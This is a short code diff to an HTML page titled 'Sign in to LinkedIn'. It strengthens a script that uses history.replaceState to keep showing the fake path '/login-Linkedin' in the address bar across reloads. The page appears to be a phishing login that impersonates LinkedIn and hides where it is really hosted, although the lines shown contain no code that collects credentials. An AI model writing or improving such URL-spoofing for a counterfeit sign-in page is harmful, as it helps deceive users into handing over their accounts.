@@ -5,20 +5,24 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Sign in to LinkedIn</title>
   <script>
-    // Minimal URL masking that won't cause 404 errors
+    // Persistent URL masking that survives reloads
     (function() {
-      const originalUrl = window.location.pathname + window.location.search;
-      if (!sessionStorage.getItem('alreadyMasked')) {
-        sessionStorage.setItem('alreadyMasked', 'true');
-        history.replaceState(null, null, "/login-Linkedin" + window.location.search);
-        window.addEventListener('beforeunload', function() {
-          history.replaceState(null, null, originalUrl);
-          sessionStorage.removeItem('alreadyMasked');
-        });
+      const maskedPath = "/login-Linkedin";
+      const originalPath = window.location.pathname;
+      
+      // Always show the masked URL
+      if (window.location.pathname !== maskedPath) {
+        history.replaceState({}, "", maskedPath + window.location.search);
       }
+      
+      // Ensure it stays masked even after reload
+      window.addEventListener('beforeunload', function() {
+        history.replaceState({}, "", maskedPath + window.location.search);
+      });
     })();
   </script>
   <style>
+    /* ALL YOUR ORIGINAL STYLES REMAIN EXACTLY THE SAME */
     body {
       font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
       background-color: #f3f6f8;
